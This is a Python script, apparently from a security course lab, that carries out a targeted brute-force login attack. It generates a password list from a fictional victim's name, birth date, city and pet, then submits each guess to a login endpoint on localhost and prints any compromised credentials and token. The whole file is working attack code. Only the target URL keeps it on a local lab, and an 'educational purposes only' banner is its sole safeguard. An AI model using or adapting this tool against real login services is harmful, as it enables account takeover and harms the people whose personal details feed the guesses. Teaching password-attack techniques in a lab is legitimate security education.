#!/usr/bin/env python3
"""
Lab 12: Advanced Brute-Force Attack
More sophisticated password generation using personal information
Includes more combination patterns and variations
"""

import requests
import itertools
from datetime import datetime
import time
import re

# Target configuration
TARGET_URL = "http://localhost:8000/login"

# Victim information
VICTIM_INFO = {
    "name": "john",
    "surname": "doe",
    "birth_year": "1990",
    "birth_month": "05",
    "birth_day": "15",
    "city": "newyork",  # Additional info attacker might know
    "pet": "max",       # Common security question answers
}

def generate_advanced_combinations(info):
    """
    Advanced password generation with more sophisticated patterns.
    """
    passwords = set()  # Use set to avoid duplicates
    
    name = info["name"].lower()
    surname = info["surname"].lower()
    year = info["birth_year"]
    month = info["birth_month"].lstrip("0")  # Remove leading zero
    day = info["birth_day"].lstrip("0")
    
    # Get additional info if available
    city = info.get("city", "").lower()
    pet = info.get("pet", "").lower()
    
    # Basic combinations
    base_combinations = [
        name, surname,
        name + surname, surname + name,
        name.capitalize() + surname.capitalize(),
    ]
    passwords.update(base_combinations)
    
    # With years (current year, birth year, variations)
    years = [year, year[-2:], "2024", "2023", "2022"]
    for y in years:
        passwords.update([
            name + y, y + name,
            surname + y, y + surname,
            name + surname + y, y + name + surname,
            name.capitalize() + y,
            surname.capitalize() + y,
        ])
    
    # Date combinations
    dates = [
        (day, month, year),
        (month, day, year),
        (day + month, year),
        (month + day, year),
        (year, month, day),
    ]
    
    for date_parts in dates:
        date_str = "".join(date_parts)
        passwords.update([
            name + date_str,
            surname + date_str,
            name + surname + date_str,
            date_str + name,
            date_str + surname,
        ])
        
        # With separators
        date_sep = "/".join(date_parts[:2]) + year
        passwords.update([
            name + date_sep.replace("/", ""),
            surname + date_sep.replace("/", ""),
        ])
    
    # With common numbers
    number_suffixes = ["123", "1234", "12345", "1", "12", "123456"]
    for num in number_suffixes:
        passwords.update([
            name + num,
            surname + num,
            name + surname + num,
            num + name,
            num + surname,
        ])
    
    # With special characters
    special_chars = ["!", "@", "#", "$", "&", "*"]
    for char in special_chars:
        passwords.update([
            name + char,
            surname + char,
            name + surname + char,
            name + char + year,
            surname + char + year,
            name + surname + char + year,
        ])
    
    # Leet speak variations (1337)
    leet_replacements = {
        "a": "@", "e": "3", "i": "1", "o": "0", "s": "$", "l": "1"
    }
    
    def to_leet(text):
        result = text
        for char, replacement in leet_replacements.items():
            result = result.replace(char, replacement)
        return result
    
    passwords.update([
        to_leet(name),
        to_leet(surname),
        to_leet(name + surname),
        name + to_leet(surname),
        to_leet(name) + surname,
    ])
    
    # With additional personal info (city, pet, etc.)
    if city:
        passwords.update([
            name + city,
            city + name,
            name + city + year,
        ])
    
    if pet:
        passwords.update([
            name + pet,
            pet + name,
            name + pet + year,
        ])
    
    # Common patterns
    common_patterns = [
        "password", "admin", "user", "welcome", "hello",
        "qwerty", "abc123", "letmein", "master"
    ]
    
    for pattern in common_patterns:
        passwords.update([
            pattern,
            pattern + year,
            name + pattern,
            pattern + name,
            name + pattern + year,
        ])
    
    # Reversed strings
    passwords.update([
        name[::-1],
        surname[::-1],
        (name + surname)[::-1],
    ])
    
    # Capitalization variations
    cap_variants = [
        name.capitalize(),
        surname.capitalize(),
        name.upper(),
        surname.upper(),
        name.capitalize() + surname.capitalize(),
    ]
    passwords.update(cap_variants)
    
    # Phone number patterns (if attacker knows area code)
    # Assuming common area codes or patterns
    area_codes = ["212", "555", "123"]
    for area in area_codes:
        passwords.update([
            area + name,
            name + area,
            area + year,
        ])
    
    return list(passwords)

def brute_force_advanced(target_username="admin"):
    """
    Advanced brute-force attack with sophisticated password generation.
    """
    print("="*70)
    print("Advanced Brute-Force Attack with Personal Information")
    print("="*70)
    print(f"Target: {TARGET_URL}")
    print(f"Target Username: {target_username}")
    print("")
    print("Victim Information:")
    for key, value in VICTIM_INFO.items():
        print(f"  {key:15}: {value}")
    print("")
    
    # Generate passwords
    print("Generating advanced password combinations...")
    passwords = generate_advanced_combinations(VICTIM_INFO)
    print(f"Generated {len(passwords)} unique password combinations")
    print("")
    
    # Optionally save to file
    with open("generated_passwords.txt", "w") as f:
        for pwd in sorted(passwords):
            f.write(pwd + "\n")
    print(f"Saved passwords to: generated_passwords.txt")
    print("")
    
    # Start attack
    print("Starting brute-force attack...")
    print("-"*70)
    
    attempts = 0
    start_time = datetime.now()
    
    for password in passwords:
        attempts += 1
        status = f"[{attempts}/{len(passwords)}]"
        print(f"{status:20} Trying: {password:30}", end=" ")
        
        try:
            response = requests.post(
                TARGET_URL,
                data={"username": target_username, "password": password},
                timeout=3
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get("status") == "success":
                    end_time = datetime.now()
                    duration = (end_time - start_time).total_seconds()
                    
                    print("✓ SUCCESS!")
                    print("")
                    print("="*70)
                    print("CREDENTIALS COMPROMISED!")
                    print("="*70)
                    print(f"Username: {target_username}")
                    print(f"Password: {password}")
                    print(f"Token: {result.get('token', 'N/A')}")
                    print(f"Attempts: {attempts}")
                    print(f"Success rate: {100.0/attempts:.4f}%")
                    print(f"Time taken: {duration:.2f} seconds")
                    print(f"Speed: {attempts/duration:.2f} attempts/sec")
                    print("="*70)
                    return True
                else:
                    print("✗")
            else:
                print("✗")
        except Exception as e:
            print(f"✗ (Error: {str(e)[:20]})")
        
        # Rate limiting
        if attempts % 10 == 0:
            time.sleep(0.1)
    
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()
    
    print("")
    print("="*70)
    print("ATTACK COMPLETED - NO VALID CREDENTIALS FOUND")
    print("="*70)
    print(f"Total attempts: {attempts}")
    print(f"Time taken: {duration:.2f} seconds")
    print(f"Average speed: {attempts/duration:.2f} attempts/sec")
    print("="*70)
    return False

if __name__ == "__main__":
    import sys
    
    print("⚠️  WARNING: Educational purposes only!")
    print("⚠️  Only use on systems you own or have permission to test.")
    print("")
    
    username = sys.argv[1] if len(sys.argv) > 1 else "admin"
    brute_force_advanced(username)

